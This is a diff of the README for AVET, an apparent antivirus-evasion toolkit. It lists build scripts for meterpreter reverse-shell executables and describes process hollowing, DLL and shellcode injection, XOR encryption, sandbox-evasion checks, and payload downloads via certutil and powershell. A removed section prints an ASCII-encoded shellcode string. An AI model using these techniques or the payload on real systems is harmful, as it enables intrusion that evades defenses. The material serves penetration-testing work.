@@ -26,9 +26,8 @@ You can use the setup script:
 ```
 ./setup.sh
 ```
-TODO: rewrite setup.sh?
 
-This will automatically get you started by installing/configuring wine, installing tdm-gcc and compiling the relevant AVET executables.
+This will automatically get you started by installing/configuring wine and installing tdm-gcc.
 You'll shortly have to click through the tdm-gcc installer GUI though - standard settings should be fine.
 
 
@@ -37,12 +36,11 @@ If for whatever reason you want to do things manually:
 How to install tdm-gcc with wine:
 [https://govolution.wordpress.com/2017/02/04/using-tdm-gcc-with-kali-2/](https://govolution.wordpress.com/2017/02/04/using-tdm-gcc-with-kali-2/)
 
-Compile all the stuff
-tbd
 
 Important Note
 --------------
 Not all techniques will evade every AV engine. If one technique or build script does not work please test another one.
+
 
 How to use 
 ----------
@@ -53,86 +51,170 @@ The build scripts themselves are written so as they have to be called from withi
 root@kalidan:~/tools/avet# ./build/build_win32_meterpreter_rev_https_50xshikata_quiet.sh
 ```
 
-You can define default LHOST and LPORT values in the `/build/global_connect_config.sh` file, which are used if you don't redefine.
+You can define default LHOST and LPORT values for metasploit payloads in the `/build/global_connect_config.sh` file, which are used if you don't redefine.
+
+
+Usage examples
+--------------
+
+Generate a 32-bit process hollowing executable in two steps (as in build_win32_meterpreter_rev_tcp_hollowing_target_cmd.sh):
+
+First, generate the hollowing payload with AVET:
+	- generate meterpreter/reverse_tcp 32-bit shellcode
+	- the meterpreter shellcode will be XOR encrypted with a 5-byte preset key
+	- the shellcode will be compiled into the generated executable
+	- fopen and gethostbyname sandbox evasion environmental checks will be made before executing the shellcode
+	
+Second, build the executable that delivers the first step payload via hollowing:
+	- statically compile the first step payload into the executable
+	- the payload will be XOR encrypted with a different 5-byte preset key
+	- again, fopen and gethostbyname sandbox evasion environmental checks will be made before hollowing
+	- the hollowing target PID will be delivered via command line argument on execution time
+	
+So you get a two-layer environmental checked and encrypted meterpreter payload, hollowed into a process of your choice.
+While the settings in the build script are mostly for demonstration purposes, there is a lot of flexibility to customize your generated executable by making simple modifications to the build script.
+You could switch out data retrieval methods: Instead of statically compiling most data into the executable, you could download your hollowing payload via powershell, download the decryption key via sockets, use different encryption or environmental checks, etc.
+Or try to add more evasion layers by doing a third build iteration.
+
+Of course, you can also design more minimalistic builds, like executing unencrypted shellcode with only one environmental check, or maybe 50 iterations of shikata are enough to reach your goal?
+Choose/modify the build scripts, suiting your needs.
 
 
 Build scripts
 -------------
-Some comments on what each script provides.
-TODO: describe new scripts
+Below, find a list of all currently shipped build scripts. The names should hint at each script's functionality.
+For detailed information, consider the comments inside the scripts.
+Feel free to modify/write your own build scripts to build your custom executable!
 
-```
 buildsvc_win32_meterpreter_bind_tcp_20xshikata.sh
-Service example for win32.
-
+build_win32_exec_calc_injectdll_target_cmd.sh
 build_win32_meterpreter_rev_https_50xshikata_quiet.sh
-In this example the evasion technique is simple. The shellcode is encoded with 20 rounds of 
-shikata-ga-nai, often enough that does the trick (note: Now it might be more ;) ). This 
-technique is pretty similar to a junk loop. Execute so much code that the AV engine breaks up 
-execution and let the file pass. Here in quiet mode, the window is hidden.
-
 build_win32_meterpreter_rev_https_50xshikata.sh
-See previous, window not hidden.
-
 build_win32_meterpreter_rev_https_ASCIIMSF_cmd.sh
-It is possible to load shellcode as a parameter from cmd like:
-C:\> pwn.exe PYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIYlzHOrgpwpEPapLIheeaIPrDLKRp00NkV26lnkCbUDlK0r4OMg0JtfEaKONLWLe1aldBTlWPo1hOVmFa8GZBJRsbRwLKPRVplKqZ7LnkRlB1CHhc2hS1Jq3alKf9Q0GqICnkG97hhcfZaYnkttlKfaJvuayoNLZaJoFm31JgehKPaeYf4CamHx7KSM5t2UzDbxlKBxFDFaKcE6lK6lpKlKshELWqKcLKeTNkFaHPni1Ta4dd3k1KaqBy2zF1ioM0qOQOpZlKR2XkLMQMphPn3UT4uPsXqgQypnQy1DcXBlqgUvFgioZuDqKkRs0SBssccc3XFZ66RYI7KO9EaCpS0jtCf3v3SXoKva30309xKtuPs07pfOabF8rlcopdG3VUrK0n07BMVYSQE2T8ROGEPOPLphP8e7du0iqj3osISqBR0grC2tCfroef1aRU1OblRMqzd1UaBx737D1OW1dpv9fV7pv0SXv7k9mOkvYokeniXFF32HEPEbM0MT63v3bsaGaCsfSXJKV5DnWKKOiENv1zgzaOE8opp3S0wpMY9p1z3460SZGorvU8CEBfMNOvkOyE1CpSaC2spVqxVMtF7hCK9oXUNekpCE5DU8OxGcc0EPaxStZPVUM0kOjupO45xMyx0LePEPWp1zspQxWpR0uPS0u8c030aPc0bs3X68i42sHeioiENs2sBsOyHgrwqxEPa0eP30v3V6cXuBofNiZByo8UmUIP448ONkFg5QO3NeKpT5Iuv8O3CojHrKYo9oyop1DyEbFNfQtvGHVNDqUafVDnubDpuhUPoKxpH5i2sf2JC0sc9ohUAA
-
 build_win32_meterpreter_rev_https_ASCIIMSF.sh
-
 build_win32_meterpreter_rev_https_fopen_shikata_quiet.sh
-AV evasion with the fopen technique, hidden window.
-
-build_win32_meterpreter_rev_https_fopen_shikata.sh
-See previous example.
-
 build_win32_meterpreter_rev_https_killswitch_shikata.sh
-AV evasion with the killswitch technique.
-
 build_win32_meterpreter_rev_https_shikata_download_certutil_raw_loadfile.sh
-Download a shellcode with the certutil.exe command and exec the shellcode.
-
 build_win32_meterpreter_rev_https_shikata_downloadexecshellcode_DKMC.sh
-Like build_win32_meterpreter_rev_https_shikata_downloadexecshellcode.sh, but also builds the
-payload with DKMC, a tool by https://github.com/mrun1k0d3r.
-For more: https://govolution.wordpress.com/2018/03/02/download-exec-poc-and-dkmc/
-
 build_win32_meterpreter_rev_https_shikata_downloadexecshellcode.sh
-This one downloads a shellcode from a webserver into memory and executes the shellcode.
-
 build_win32_meterpreter_rev_https_shikata_download_powershell_raw_loadfile.sh
-Download a shellcode with a powershell command and exec the shellcode.
-
+build_win32_meterpreter_rev_https_shikata_fopen_avet_encoding.sh
 build_win32_meterpreter_rev_https_shikata_fopen.sh
-Sandbox evasion with fopen and additional encoding
-
 build_win32_meterpreter_rev_https_shikata_loadfile.sh
-Loading and exec shellcode from given file, needs avets encoding.
-
 build_win32_meterpreter_rev_https_shikata_load_ie.sh
-This is a bit tricky and might not work on the first shot. The executable will start Internet Explorer and download the ASCII encoded shellcode. Then the shellcode will be read from the cache directory and if found executed. This was tested with Windows 7 only.
-
-build_win32_meterpreter_rev_https_shikata_load_ie_debug.sh
-Same as before with debug output.
-
 build_win32_meterpreter_rev_https_shikata_raw_loadfile.sh
-Example for loading raw shellcode files.
-
+build_win32_meterpreter_rev_tcp_hollowing_target_cmd.sh
+build_win32_meterpreter_rev_tcp_injectshellcode_target_cmd.sh
 build_win32_meterpreter_unstaged_rev_https_40xshikata.sh
-Unstaged payload with dlls included. For more see https://govolution.wordpress.com/2017/05/06/avet-and-unstaged-payloads/
-
 build_win32_shell_rev_tcp_shikata_fopen_kaspersky.sh
-Build this one for Kaspersky, don't know if it is still unrecognized.
+build_win64_exec_calc_injectdll_target_cmd.sh
+build_win64_meterpreter_rev_https_hollowing_target_cmd.sh
+build_win64_meterpreter_rev_https_injectshellcode_target_cmd.sh
+build_win64_meterpreter_rev_https_xor_avet.sh
+build_win64_meterpreter_rev_https_xor_downloadexecshellcode.sh
+build_win64_meterpreter_rev_https_xor_fopen.sh
 
-build_win64_meterpreter_rev_tcp_xor_downloadexecshellcode.sh
-This one downloads a shellcode from a webserver into memory and executes the shellcode.
 
-build_win64_meterpreter_rev_tcp_xor_fopen.sh
-64bit executable with fopen evasion.
+Features
+--------
 
-build_win64_meterpreter_rev_tcp_xor.sh
-64bit executable.
+##Data retrieval methods
+
+#static_from_file
+The data is retrieved from a file and is statically compiled into the generated executable.
+For this to work, the data must be provided as a c-style array at compilation time, like
 ```
+unsigned char buf[] = "\x00\x11\x22\x33";
+```
+
+#dynamic_from_file
+The data is read from a file at run time.
+
+#from_command_line_hex
+Retrieves data from a "11aabb22.." format hex string (from the command line).
+
+#from_command_line_raw
+Retrieves data from a command line argument. The given ASCII string is interpreted as raw byte data.
+
+#download_certutil
+Downloads data from a specified URI, using ```certutil.exe -urlcache -split -f```.
+Drops the downloaded file to disk before reading the data.
+
+#download_internet_explorer
+Downloads data from a specified URL, using Internet Explorer.
+Drops the downloaded file to disk before reading the data.
+
+#download_powershell
+Downloads data from a specified URI via powershell.
+Drops the downloaded file to disk before reading the data.
+
+#download_socket
+Downloads the data from a specified URI, using sockets.
+Data is read directly into memory, no file is dropped to disk.
+
+
+##Payload execution methods
+
+#exec_shellcode
+Executes 32-bit shellcode with a C function binding.
+
+#exec_shellcode64
+Executes 64-bit shellcode with a C function binding and VirtualProtect.
+
+#exec_shellcode_ASCIIMSF
+Executes ASCIIMSF encoded shellcode via ```call eax```.
+
+#hollowing32
+Instanciates a new process, cuts out the original image and hollows the given payload into the new process.
+The payload is a 32-bit executable image. Works on 32-bit targets.
+
+#hollowing64
+Same as hollowing32, but using 64-bit PE payloads for 64-bit target processes.
+
+#inject_dll
+Injects a dll into a target process, using ```CreateRemoteThread```.
+Injection works for 32-bit payloads into 32-bit processes, and 64-bit payloads into 64-bit processes, respectively.
+
+#inject_shellcode
+Injects shellcode into a target process, using ```CreateRemoteThread```.
+Injection work for 32-bit shellcode into 32-bit processes, and 64-bit shellcode into 64-bit processes, respectively.
+
+
+##Encryption/Encoding
+
+#xor
+Rolling XOR, supporting multi-byte keys.
+
+#AVET
+Custom encoding, reinterpreting the ASCII format.
+
+
+##Sandbox evasion
+
+#fopen
+Checks for the existence of ```C:\windows\system.ini```. If not found, stop execution.
+
+#gethostbyname
+Try to resolve a hostname of your choice. If gethostbyname returns unequals NULL, stop execution.
+
+#hide_console
+Not really an evasion technique, but hides your console window ;)
+
+
+##Helper tools
+
+#data_raw_to_c
+Takes raw data as input from a file, converts it into C-array format and writes output to another file.
+This aids in providing the correct format for the static_from_file data retrieval method.
+
+#generate_key
+Key generation utility. Generates either a (non-cryptographically) random key or takes a preset key as input,
+and outputs the raw key data into a specified file.
+This aids in providing key material for the AVET encryption feature.
+
+#sh_format
+Utility from AVET 1.3 that performs AVET encoding.
+
 
 AVET & metasploit psexec
 ------------------------
